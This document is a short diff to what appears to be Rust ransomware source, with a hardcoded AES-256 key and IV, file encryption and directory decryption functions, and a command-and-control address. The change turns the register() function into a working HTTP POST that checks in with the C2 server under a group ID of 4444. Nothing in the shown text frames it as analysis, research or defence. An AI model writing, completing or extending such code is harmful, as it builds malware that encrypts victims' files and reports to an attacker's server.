@@ -13,7 +13,7 @@ use std::fs;
 use std::io::{Read, Write};
 use std::error::Error;
 use std::str::{self, FromStr};
-use reqwest::blocking::Request;
+use reqwest::blocking::{Client, Request};
 
 
 type Aes256Cbc = Cbc<Aes256, Pkcs7>;
@@ -21,6 +21,7 @@ type Aes256Cbc = Cbc<Aes256, Pkcs7>;
 const KEY: &[u8] = b"kYmfk8pkMkgR9nj3EQ4x0JuJn6Qwq0cQ";
 const IV: &[u8] = b"unique_initializ"; // IV should be 16 bytesA
 const C2ADDR: &str = "c2serveraddr";
+const GID: i32 = 4444;
                                 
 
 fn encrypt_file(input_path: &str, output_path: &str) -> Result<(), Box<dyn Error>> {
@@ -99,7 +100,8 @@ pub fn decrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
 }
 
 pub fn register() -> Result<(), Box<dyn Error>> {
-    let c2_register_url = format!("http://{C2ADDR}/client/register");
-    let _register_reqwest = Request::new(reqwest::Method::POST, reqwest::Url::from_str(&c2_register_url)?);
+    let client = Client::new();
+    let url = format!("https://{C2ADDR}/client/{GID}/register");
+    client.post(url).send()?;
     Ok(())
 }
